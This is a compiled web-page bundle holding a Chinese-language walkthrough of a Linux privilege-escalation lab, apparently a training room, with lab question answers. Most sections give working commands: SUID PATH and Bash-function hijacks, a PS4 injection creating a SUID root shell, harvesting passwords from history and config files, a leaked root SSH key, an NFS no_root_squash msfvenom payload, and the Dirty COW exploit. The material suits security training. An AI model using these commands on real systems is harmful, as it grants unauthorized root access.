shell\uff1a"]}),"\n",(0,l.jsx)(s.pre,{children:(0,l.jsx)(s.code,{className:"language-shell",children:"gcc -o service /home/user/tools/suid/service.c\n"})}),"\n",(0,l.jsxs)(s.p,{children:["\u5728 ",(0,l.jsx)(s.code,{children:"PATH"})," \u53d8\u91cf\u4e2d\u6dfb\u52a0\u5f53\u524d\u76ee\u5f55\uff08\u6216\u65b0\u7684 ",(0,l.jsx)(s.code,{children:"service"})," \u53ef\u6267\u884c\u6587\u4ef6\u6240\u5728\u7684\u76ee\u5f55\uff09\uff0c\u7136\u540e\u8fd0\u884c ",(0,l.jsx)(s.code,{children:"suid-env"})," \u53ef\u6267\u884c\u6587\u4ef6\u4ee5\u83b7\u53d6 root shell\uff1a"]}),"\n",(0,l.jsx)(s.pre,{children:(0,l.jsx)(s.code,{className:"language-shell",children:"PATH=.:$PATH /usr/local/bin/suid-env\n"})}),"\n",(0,l.jsx)(s.p,{children:"\u8bb0\u5f97\u5728\u7ee7\u7eed\u4e4b\u524d\u9000\u51fa root shell\uff01"}),"\n",(0,l.jsx)(s.h2,{id:"suid--sgid-\u53ef\u6267\u884c\u6587\u4ef6---\u6ee5\u7528-shell-\u529f\u80fd1",children:"SUID / SGID \u53ef\u6267\u884c\u6587\u4ef6 - \u6ee5\u7528 Shell \u529f\u80fd\uff08#1\uff09"}),"\n",(0,l.jsxs)(s.p,{children:[(0,l.jsx)(s.code,{children:"/usr/local/bin/suid-env2"})," \u53ef\u6267\u884c\u6587\u4ef6\u4e0e ",(0,l.jsx)(s.code,{children:"/usr/local/bin/suid-env"})," \u5b8c\u5168\u76f8\u540c\uff0c\u552f\u4e00\u4e0d\u540c\u4e4b\u5904\u5728\u4e8e\u5b83\u4f7f\u7528\u4e86 service \u53ef\u6267\u884c\u6587\u4ef6\u7684\u7edd\u5bf9\u8def\u5f84 (",(0,l.jsx)(s.code,{children:"/usr/sbin/service"}),") \u6765\u542f\u52a8 apache2 web \u670d\u52a1\u5668\u3002"]}),"\n",(0,l.jsx)(s.p,{children:"\u8bf7\u4f7f\u7528 strings \u547d\u4ee4\u9a8c\u8bc1\u4e00\u4e0b\uff1a"}),"\n",(0,l.jsx)(s.pre,{children:(0,l.jsx)(s.code,{className:"language-shell",children:"strings /usr/local/bin/suid-env2\n"})}),"\n",(0,l.jsxs)(s.p,{children:["\u5728 Bash \u7248\u672c\u4f4e\u4e8e ",(0,l.jsx)(s.code,{children:"4.2-048"})," \u7684\u60c5\u51b5\u4e0b\uff0c\u53ef\u4ee5\u5b9a\u4e49\u540d\u79f0\u7c7b\u4f3c\u6587\u4ef6\u8def\u5f84\u7684 shell \u51fd\u6570\uff0c\u7136\u540e\u5bfc\u51fa\u8fd9\u4e9b\u51fd\u6570\uff0c\u4f7f\u5176\u5728\u4f7f\u7528\u65f6\u66ff\u4ee3\u8be5\u6587\u4ef6\u8def\u5f84\u4e0b\u7684\u4efb\u4f55\u5b9e\u9645\u53ef\u6267\u884c\u6587\u4ef6\u3002"]}),"\n",(0,l.jsxs)(s.p,{children:["\u9a8c\u8bc1\u4e00\u4e0b Debian \u865a\u62df\u673a\u4e0a\u5b89\u88c5\u7684 Bash \u7248\u672c\u662f\u5426\u4f4e\u4e8e ",(0,l.jsx)(s.code,{children:"4.2-048"})," \uff1a"]}),"\n",(0,l.jsx)(s.pre,{children:(0,l.jsx)(s.code,{className:"language-shell",children:"/bin/bash --version\n"})}),"\n",(0,l.jsxs)(s.p,{children:["\u521b\u5efa\u4e00\u4e2a\u540d\u4e3a ",(0,l.jsx)(s.code,{children:"/usr/sbin/service"})," \u7684 Bash \u51fd\u6570\uff0c\u8be5\u51fd\u6570\u6267\u884c\u4e00\u4e2a\u65b0\u7684 Bash shell\uff08\u4f7f\u7528 ",(0,l.jsx)(s.code,{children:"-p"})," \u4ee5\u4fdd\u7559\u6743\u9650\uff09\uff0c\u7136\u540e\u5bfc\u51fa\u8be5\u51fd\u6570\uff1a"]}),"\n",(0,l.jsx)(s.pre,{children:(0,l.jsx)(s.code,{className:"language-shell",children:"function /usr/sbin/service {/bin/bash -p;}\nexport -f /usr/sbin/service\n"})}),"\n",(0,l.jsxs)(s.p,{children:["\u8fd0\u884c ",(0,l.jsx)(s.code,{children:"suid-env2"})," \u53ef\u6267\u884c\u6587\u4ef6\u4ee5\u83b7\u53d6 root shell\uff1a"]}),"\n",(0,l.jsx)(s.pre,{children:(0,l.jsx)(s.code,{className:"language-shell",children:"/usr/local/bin/suid-env2\n"})}),"\n",(0,l.jsx)(s.p,{children:"\u8bb0\u5f97\u5728\u7ee7\u7eed\u4e4b\u524d\u9000\u51fa root shell\uff01"}),"\n",(0,l.jsx)(s.h2,{id:"suid--sgid-\u53ef\u6267\u884c\u6587\u4ef6---\u6ee5\u7528-shell-\u529f\u80fd2",children:"SUID / SGID \u53ef\u6267\u884c\u6587\u4ef6 - \u6ee5\u7528 Shell \u529f\u80fd\uff08#2\uff09"}),"\n",(0,l.jsx)(s.admonition,{type:"note",children:(0,l.jsxs)(s.p,{children:["\u8fd9\u79cd\u65b9\u6cd5\u5728 ",(0,l.jsx)(s.code,{children:"Bash 4.4"})," \u53ca\u66f4\u9ad8\u7248\u672c\u4e0a\u65e0\u6cd5\u751f\u6548\u3002"]})}),"\n",(0,l.jsxs)(s.p,{children:["\u5728\u8c03\u8bd5\u6a21\u5f0f\u4e0b\uff0cBash \u4f7f\u7528\u73af\u5883\u53d8\u91cf ",(0,l.jsx)(s.code,{children:"PS4"})," \u6765\u663e\u793a\u7528\u4e8e\u8c03\u8bd5\u8bed\u53e5\u7684\u989d\u5916\u63d0\u793a\u3002"]}),"\n",(0,l.jsxs)(s.p,{children:["\u4ee5\u542f\u7528 Bash \u8c03\u8bd5\u5e76\u5c06 ",(0,l.jsx)(s.code,{children:"PS4"})," \u53d8\u91cf\u8bbe\u7f6e\u4e3a\u4e00\u4e2a\u5d4c\u5165\u5f0f\u547d\u4ee4\u7684\u65b9\u5f0f\u8fd0\u884c ",(0,l.jsx)(s.code,{children:"/usr/local/bin/suid-env2"})," \u53ef\u6267\u884c\u6587\u4ef6\uff0c\u8be5\u547d\u4ee4\u5c06\u521b\u5efa ",(0,l.jsx)(s.code,{children:"/bin/bash"})," \u7684 SUID \u7248\u672c\uff1a"]}),"\n",(0,l.jsx)(s.pre,{children:(0,l.jsx)(s.code,{className:"language-shell",children:"env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2\n"})}),"\n",(0,l.jsxs)(s.p,{children:["\u8fd0\u884c ",(0,l.jsx)(s.code,{children:"/tmp/rootbash"})," \u53ef\u6267\u884c\u6587\u4ef6\u5e76\u9644\u52a0 ",(0,l.jsx)(s.code,{children:"-p"})," \u9009\u9879\u4ee5\u83b7\u53d6\u4ee5 root \u6743\u9650\u8fd0\u884c\u7684 shell\uff1a"]}),"\n",(0,l.jsx)(s.pre,{children:(0,l.jsx)(s.code,{className:"language-shell",children:"/tmp/rootbash -p\n"})}),"\n",(0,l.jsxs)(s.p,{children:["\u8bb0\u5f97\u5728\u7ee7\u7eed\u4e4b\u524d\u79fb\u9664 ",(0,l.jsx)(s.code,{children:"/tmp/rootbash"})," \u53ef\u6267\u884c\u6587\u4ef6\u5e76\u9000\u51fa\u63d0\u6743\u540e\u7684 shell\uff0c\u56e0\u4e3a\u7a0d\u540e\u4f60\u5c06\u5728\u623f\u95f4\u4e2d\u518d\u6b21\u521b\u5efa\u8fd9\u4e2a\u6587\u4ef6\uff01"]}),"\n",(0,l.jsx)(s.pre,{children:(0,l.jsx)(s.code,{className:"language-shell",children:"rm /tmp/rootbash\nexit\n"})}),"\n",(0,l.jsx)(s.h2,{id:"\u5bc6\u7801\u4e0e\u5bc6\u94a5---\u5386\u53f2\u6587\u4ef6",children:"\u5bc6\u7801\u4e0e\u5bc6\u94a5 - \u5386\u53f2\u6587\u4ef6"}),"\n",(0,l.jsx)(s.p,{children:"\u5982\u679c\u7528\u6237\u4e0d\u5c0f\u5fc3\u5728\u547d\u4ee4\u884c\u4e2d\u8f93\u5165\u5bc6\u7801\u800c\u4e0d\u662f\u5728\u5bc6\u7801\u63d0\u793a\u7b26\u4e2d\u8f93\u5165\uff0c\u5bc6\u7801\u53ef\u80fd\u4f1a\u88ab\u8bb0\u5f55\u5728\u5386\u53f2\u6587\u4ef6\u4e2d\u3002"}),"\n",(0,l.jsx)(s.p,{children:"\u67e5\u770b\u7528\u6237\u4e3b\u76ee\u5f55\u4e2d\u6240\u6709\u9690\u85cf\u5386\u53f2\u6587\u4ef6\u7684\u5185\u5bb9\uff1a"}),"\n",(0,l.jsx)(s.pre,{children:(0,l.jsx)(s.code,{className:"language-shell",children:"cat ~/.*history | less\n"})}),"\n",(0,l.jsx)(s.p,{children:'\u8bf7\u6ce8\u610f\uff0c\u7528\u6237\u66fe\u5c1d\u8bd5\u8fde\u63a5\u5230 MySQL \u670d\u52a1\u5668\uff0c\u4f7f\u7528\u4e86 "root" \u7528\u6237\u540d\u548c\u901a\u8fc7\u547d\u4ee4\u884c\u63d0\u4ea4\u7684\u5bc6\u7801\u3002\u8bf7\u6ce8\u610f\uff0c-p \u9009\u9879\u548c\u5bc6\u7801\u4e4b\u95f4\u6ca1\u6709\u7a7a\u683c\uff01'}),"\n",(0,l.jsx)(s.p,{children:"\u4f7f\u7528\u5bc6\u7801\u5207\u6362\u5230 root \u7528\u6237\uff1a"}),"\n",(0,l.jsx)(s.pre,{children:(0,l.jsx)(s.code,{className:"language-shell",children:"su root\n"})}),"\n",(0,l.jsx)(s.p,{children:"\u5728\u7ee7\u7eed\u4e4b\u524d\uff0c\u8bf7\u8bb0\u5f97\u9000\u51fa root shell\uff01"}),"\n",(0,l.jsxs)(s.admonition,{title:"Answer the questions below",type:"info",children:[(0,l.jsx)(s.p,{children:"\u7528\u6237\u6267\u884c\u7684\u5b8c\u6574 mysql \u547d\u4ee4\u662f\u4ec0\u4e48\uff1f"}),(0,l.jsx)(s.pre,{children:(0,l.jsx)(s.code,{className:"language-plaintext",children:"mysql -h somehost.local -uroot -ppassword123\n"})})]}),"\n",(0,l.jsx)(s.h2,{id:"\u5bc6\u7801\u4e0e\u5bc6\u94a5---\u914d\u7f6e\u6587\u4ef6",children:"\u5bc6\u7801\u4e0e\u5bc6\u94a5 - \u914d\u7f6e\u6587\u4ef6"}),"\n",(0,l.jsx)(s.p,{children:"\u914d\u7f6e\u6587\u4ef6\u901a\u5e38\u4ee5\u660e\u6587\u6216\u5176\u4ed6\u53ef\u9006\u8f6c\u683c\u5f0f\u5305\u542b\u5bc6\u7801\u4fe1\u606f\u3002"}),"\n",(0,l.jsx)(s.p,{children:"\u5217\u51fa\u7528\u6237\u4e3b\u76ee\u5f55\u7684\u5185\u5bb9\uff1a"}),"\n",(0,l.jsx)(s.pre,{children:(0,l.jsx)(s.code,{className:"language-shell",children:"ls /home/user\n"})}),"\n",(0,l.jsxs)(s.p,{children:["\u8bf7\u6ce8\u610f\u5b58\u5728\u4e00\u4e2a\u540d\u4e3a ",(0,l.jsx)(s.code,{children:"myvpn.ovpn"})," \u7684\u914d\u7f6e\u6587\u4ef6\u3002\u67e5\u770b\u6587\u4ef6\u5185\u5bb9\uff1a"]}),"\n",(0,l.jsx)(s.pre,{children:(0,l.jsx)(s.code,{className:"language-shell",children:"cat /home/user/myvpn.ovpn\n"})}),"\n",(0,l.jsx)(s.p,{children:"\u8be5\u6587\u4ef6\u5e94\u8be5\u5305\u542b\u4e00\u4e2a\u6307\u5411\u53e6\u4e00\u4e2a\u4f4d\u7f6e\u7684\u5f15\u7528\uff0c\u5176\u4e2d\u53ef\u4ee5\u627e\u5230 root \u7528\u6237\u7684\u51ed\u636e\u3002\u4f7f\u7528\u8fd9\u4e9b\u51ed\u636e\u5207\u6362\u5230 root \u7528\u6237\uff1a"}),"\n",(0,l.jsx)(s.pre,{children:(0,l.jsx)(s.code,{className:"language-shell",children:"su root\n"})}),"\n",(0,l.jsx)(s.p,{children:"\u5728\u7ee7\u7eed\u4e4b\u524d\uff0c\u8bf7\u8bb0\u5f97\u9000\u51fa root shell\uff01"}),"\n",(0,l.jsxs)(s.admonition,{title:"Answer the questions below",type:"info",children:[(0,l.jsx)(s.p,{children:"\u5728\u54ea\u4e2a\u6587\u4ef6\u4e2d\u627e\u5230 root \u7528\u6237\u7684\u51ed\u636e\uff1f"}),(0,l.jsx)(s.pre,{children:(0,l.jsx)(s.code,{className:"language-plaintext",children:"/etc/openvpn/auth.txt\n"})})]}),"\n",(0,l.jsx)(s.h2,{id:"\u5bc6\u7801\u4e0e\u5bc6\u94a5---ssh-\u5bc6\u94a5",children:"\u5bc6\u7801\u4e0e\u5bc6\u94a5 - SSH \u5bc6\u94a5"}),"\n",(0,l.jsx)(s.p,{children:"\u6709\u65f6\u7528\u6237\u4f1a\u5907\u4efd\u91cd\u8981\u6587\u4ef6\uff0c\u4f46\u672a\u80fd\u4f7f\u7528\u6b63\u786e\u7684\u6743\u9650\u4fdd\u62a4\u5b83\u4eec\u3002"}),"\n",(0,l.jsx)(s.p,{children:"\u5728\u7cfb\u7edf\u6839\u76ee\u5f55\u4e2d\u67e5\u627e\u9690\u85cf\u6587\u4ef6\u548c\u76ee\u5f55\uff1a"}),"\n",(0,l.jsx)(s.pre,{children:(0,l.jsx)(s.code,{className:"language-shell",children:"ls -la /\n"})}),"\n",(0,l.jsxs)(s.p,{children:["\u8bf7\u6ce8\u610f\uff0c\u4f3c\u4e4e\u5b58\u5728\u4e00\u4e2a\u540d\u4e3a ",(0,l.jsx)(s.code,{children:".ssh"})," \u7684\u9690\u85cf\u76ee\u5f55\u3002\u67e5\u770b\u76ee\u5f55\u5185\u5bb9\uff1a"]}),"\n",(0,l.jsx)(s.pre,{children:(0,l.jsx)(s.code,{className:"language-shell",children:"ls -l /.ssh\n"})}),"\n",(0,l.jsxs)(s.p,{children:["\u8bf7\u6ce8\u610f\uff0c\u6709\u4e00\u4e2a\u540d\u4e3a ",(0,l.jsx)(s.code,{children:"root_key"})," \u7684\u5168\u5c40\u53ef\u8bfb\u6587\u4ef6\u3002\u8fdb\u4e00\u6b65\u68c0\u67e5\u8fd9\u4e2a\u6587\u4ef6\u5e94\u8be5\u663e\u793a\u5b83\u662f\u4e00\u4e2a\u79c1\u4eba SSH \u5bc6\u94a5\u3002\u6587\u4ef6\u540d\u6697\u793a\u5b83\u662f\u7528\u4e8e root \u7528\u6237\u7684\u3002"]}),"\n",(0,l.jsxs)(s.p,{children:["\u5c06\u5bc6\u94a5\u590d\u5236\u5230\u60a8\u7684 Kali \u7cfb\u7edf\uff08\u6700\u7b80\u5355\u7684\u65b9\u6cd5\u662f\u67e5\u770b ",(0,l.jsx)(s.code,{children:"root_key"})," \u6587\u4ef6\u7684\u5185\u5bb9\uff0c\u7136\u540e\u590d\u5236 / \u7c98\u8d34\u5bc6\u94a5\uff09\uff0c\u5e76\u8d4b\u4e88\u6b63\u786e\u7684\u6743\u9650\uff0c\u5426\u5219\u60a8\u7684 SSH \u5ba2\u6237\u7aef\u5c06\u62d2\u7edd\u4f7f\u7528\u5b83\u3002"]}),"\n",(0,l.jsx)(s.pre,{children:(0,l.jsx)(s.code,{className:"language-shell",children:"chmod 600 root_key\n"})}),"\n",(0,l.jsx)(s.p,{children:"\u4f7f\u7528\u8fd9\u4e2a\u5bc6\u94a5\u767b\u5f55\u5230 Debian \u865a\u62df\u673a\u7684 root \u8d26\u6237\uff08\u8bf7\u6ce8\u610f\uff0c\u7531\u4e8e\u7cfb\u7edf\u7684\u5e74\u4ee3\u8f83\u4e45\u8fdc\uff0c\u4f7f\u7528 SSH \u65f6\u53ef\u80fd\u9700\u8981\u4e00\u4e9b\u989d\u5916\u7684\u8bbe\u7f6e\uff09\u3002"}),"\n",(0,l.jsx)(s.pre,{children:(0,l.jsx)(s.code,{className:"language-shell",children:"ssh -i root_key -oPubkeyAcceptedKeyTypes=+ssh-rsa -oHostKeyAlgorithms=+ssh-rsa root@10.10.243.70\n"})}),"\n",(0,l.jsx)(s.p,{children:"\u5728\u7ee7\u7eed\u4e4b\u524d\uff0c\u8bf7\u8bb0\u5f97\u9000\u51fa root shell\uff01"}),"\n",(0,l.jsx)(s.h2,{id:"nfs",children:"NFS"}),"\n",(0,l.jsx)(s.p,{children:"\u901a\u8fc7 NFS \u521b\u5efa\u7684\u6587\u4ef6\u4f1a\u7ee7\u627f\u8fdc\u7a0b\u7528\u6237\u7684 ID\u3002\u5982\u679c\u7528\u6237\u662f root\uff0c\u5e76\u4e14\u542f\u7528\u4e86 root \u538b\u7f29\uff08root squashing\uff09\uff0c\u90a3\u4e48 ID \u5c06\u88ab\u8bbe\u7f6e\u4e3a \u201cnobody\u201d \u7528\u6237\u3002"}),"\n",(0,l.jsx)(s.p,{children:"\u68c0\u67e5 Debian \u865a\u62df\u673a\u4e0a\u7684 NFS \u5171\u4eab\u914d\u7f6e\uff1a"}),"\n",(0,l.jsx)(s.pre,{children:(0,l.jsx)(s.code,{className:"language-shell",children:"cat /etc/exports\n"})}),"\n",(0,l.jsxs)(s.p,{children:["\u8bf7\u6ce8\u610f\uff0c",(0,l.jsx)(s.code,{children:"/tmp"})," \u5171\u4eab\u5df2\u7981\u7528\u4e86 root \u538b\u7f29\u3002"]}),"\n",(0,l.jsx)(s.p,{children:"\u5728\u60a8\u7684 Kali \u7cfb\u7edf\u4e0a\uff0c\u5982\u679c\u60a8\u8fd8\u6ca1\u6709\u4ee5 root \u7528\u6237\u8eab\u4efd\u8fd0\u884c\uff0c\u8bf7\u5207\u6362\u5230 root \u7528\u6237\uff1a"}),"\n",(0,l.jsx)(s.pre,{children:(0,l.jsx)(s.code,{className:"language-shell",children:"sudo su\n"})}),"\n",(0,l.jsxs)(s.p,{children:["\u4f7f\u7528 Kali \u7684 root \u7528\u6237\uff0c\u5728\u60a8\u7684 Kali \u7cfb\u7edf\u4e0a\u521b\u5efa\u4e00\u4e2a\u6302\u8f7d\u70b9\uff0c\u5e76\u6302\u8f7d ",(0,l.jsx)(s.code,{children:"/tmp"})," \u5171\u4eab\uff08\u6839\u636e\u9700\u8981\u66f4\u65b0 IP\uff09\uff1a"]}),"\n",(0,l.jsx)(s.pre,{children:(0,l.jsx)(s.code,{className:"language-shell",children:"mkdir /tmp/nfs\nmount -o rw,vers=3 10.10.10.10:/tmp /tmp/nfs\n"})}),"\n",(0,l.jsxs)(s.p,{children:["\u7ee7\u7eed\u4f7f\u7528 Kali \u7684 root \u7528\u6237\uff0c\u4f7f\u7528 ",(0,l.jsx)(s.code,{children:"msfvenom"})," \u751f\u6210\u4e00\u4e2a payload\uff0c\u5e76\u5c06\u5176\u4fdd\u5b58\u5230\u6302\u8f7d\u7684\u5171\u4eab\u76ee\u5f55\u4e2d\uff08\u8fd9\u4e2a payload \u53ea\u662f\u8c03\u7528 ",(0,l.jsx)(s.code,{children:"/bin/bash"})," \uff09\uff1a"]}),"\n",(0,l.jsx)(s.pre,{children:(0,l.jsx)(s.code,{className:"language-shell",children:'msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf\n'})}),"\n",(0,l.jsx)(s.p,{children:"\u4ecd\u7136\u4f7f\u7528 Kali \u7684 root \u7528\u6237\uff0c\u5c06\u6587\u4ef6\u8bbe\u4e3a\u53ef\u6267\u884c\u5e76\u8bbe\u7f6e SUID \u6743\u9650\uff1a"}),"\n",(0,l.jsx)(s.pre,{children:(0,l.jsx)(s.code,{className:"language-shell",children:"chmod +xs /tmp/nfs/shell.elf\n"})}),"\n",(0,l.jsx)(s.p,{children:"\u56de\u5230 Debian \u865a\u62df\u673a\uff0c\u5728\u4f4e\u6743\u9650\u7528\u6237\u8d26\u6237\u4e0b\u6267\u884c\u8be5\u6587\u4ef6\u4ee5\u83b7\u53d6 root shell\uff1a"}),"\n",(0,l.jsx)(s.pre,{children:(0,l.jsx)(s.code,{className:"language-shell",children:"/tmp/shell.elf\n"})}),"\n",(0,l.jsx)(s.p,{children:"\u5728\u7ee7\u7eed\u4e4b\u524d\uff0c\u8bf7\u8bb0\u5f97\u9000\u51fa root shell\uff01"}),"\n",(0,l.jsxs)(s.admonition,{title:"Answer the questions below",type:"info",children:[(0,l.jsx)(s.p,{children:"\u7981\u7528 root \u538b\u7f29\u7684\u9009\u9879\u7684\u540d\u79f0\u662f\u4ec0\u4e48\uff1f"}),(0,l.jsx)(s.pre,{children:(0,l.jsx)(s.code,{className:"language-shell",children:"no_root_squash\n"})})]}),"\n",(0,l.jsx)(s.h2,{id:"\u5185\u6838\u6f0f\u6d1e\u5229\u7528",children:"\u5185\u6838\u6f0f\u6d1e\u5229\u7528"}),"\n",(0,l.jsx)(s.p,{children:"\u5185\u6838\u6f0f\u6d1e\u5229\u7528\u53ef\u80fd\u5bfc\u81f4\u7cfb\u7edf\u5904\u4e8e\u4e0d\u7a33\u5b9a\u72b6\u6001\uff0c\u56e0\u6b64\u53ea\u6709\u5728\u6700\u540e\u4e00\u79cd\u60c5\u51b5\u4e0b\u624d\u5e94\u8be5\u8fd0\u884c\u5b83\u4eec\u3002"}),"\n",(0,l.jsxs)(s.p,{children:["\u8fd0\u884c ",(0,l.jsx)(s.code,{children:"Linux Exploit Suggester 2"})," \u5de5\u5177\uff0c\u8bc6\u522b\u5f53\u524d\u7cfb\u7edf\u53ef\u80fd\u5b58\u5728\u7684\u5185\u6838\u6f0f\u6d1e\u5229\u7528\uff1a"]}),"\n",(0,l.jsx)(s.pre,{children:(0,l.jsx)(s.code,{className:"language-shell",children:"perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl\n"})}),"\n",(0,l.jsxs)(s.p,{children:["\u8fd9\u4e2a\u77e5\u540d\u7684 Linux \u5185\u6838\u6f0f\u6d1e\u5229\u7528\u79f0\u4e3a ",(0,l.jsx)(s.code,{children:"Dirty COW"})," \u3002",(0,l.jsx)(s.code,{children:"Dirty COW"})," \u7684\u6f0f\u6d1e\u4ee3\u7801\u53ef\u4ee5\u5728 ",(0,l.jsx)(s.code,{children:"/home/user/tools/kernel-exploits/dirtycow/c0w.c"})," \u627e\u5230\u3002\u5b83\u4f1a\u7528\u4e00\u4e2a\u4ea7\u751f shell \u7684\u6587\u4ef6\u66ff\u6362 SUID \u6587\u4ef6 ",(0,l.jsx)(s.code,{children:"/usr/bin/passwd"}),"\uff08 ",(0,l.jsx)(s.code,{children:"/usr/bin/passwd"})," \u7684\u5907\u4efd\u5b58\u653e\u5728 /tmp/bak\uff09\u3002"]}),"\n",(0,l.jsx)(s.p,{children:"\u7f16\u8bd1\u8fd9\u6bb5\u4ee3\u7801\u5e76\u8fd0\u884c\u5b83\uff08\u8bf7\u6ce8\u610f\uff0c\u8fd9\u53ef\u80fd\u9700\u8981\u51e0\u5206\u949f\u624d\u80fd\u5b8c\u6210\uff09\uff1a"}),"\n",(0,l.jsx)(s.pre,{children:(0,l.jsx)(s.code,{className:"language-shell",children:"gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w\n./c0w\n"})}),"\n",(0,l.jsxs)(s.p,{children:["\u6f0f\u6d1e\u5229\u7528\u5b8c\u6210\u540e\uff0c\u8fd0\u884c ",(0,l.jsx)(s.code,{children:"/usr/bin/passwd"})," \u6765\u83b7\u53d6\u4e00\u4e2a root shell\uff1a"]}),"\n",(0,l.jsx)(s.pre,{children:(0,l.jsx)(s.code,{className:"language-shell",children:"/usr/bin/passwd\n"})}),"\n",(0,l.jsxs)(s.p,{children:["\u5728\u7ee7\u7eed\u4e4b\u524d\uff0c\u8bf7\u8bb0\u5f97\u6062\u590d\u539f\u59cb\u7684 ",(0,l.jsx)(s.code,{children:"/usr/bin/passwd"})," \u6587\u4ef6\u5e76\u9000\u51fa root shell\uff01"]}),"\n",(0,l.jsx)(s.pre,{children:(0,l.jsx)(s.code,{className:"language-shell",children:"mv /tmp/bak /usr/bin/passwd\nexit\n"})}),"\n",(0,l.jsx)(s.h2,{id:"\u7279\u6743\u5347\u7ea7\u811a\u672c",children:"\u7279\u6743\u5347\u7ea7\u811a\u672c"}),"\n",(0,l.jsx)(s.p,{children:"TODO \u5c1a\u672a\u5b8c\u6210"})]})}function t(e={}){const{wrapper:s}={...(0,r.a)(),...e.components};return s?(0,l.jsx)(s,{...e,children:(0,l.jsx)(a,{...e})}):a(e)}},1151:(e,s,n)=>{n.d(s,{Z:()=>d,a:()=>i});var l=n(7294);const r={},c=l.createContext(r);function i(e){const s=l.useContext(c);return l.useMemo((function(){return"function"==typeof e?e(s):{...s,...e}}),[s,e])}function d(e){let s;return s=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:i(e.components),l.createElement(c.Provider,{value:s},e.children)}}}]);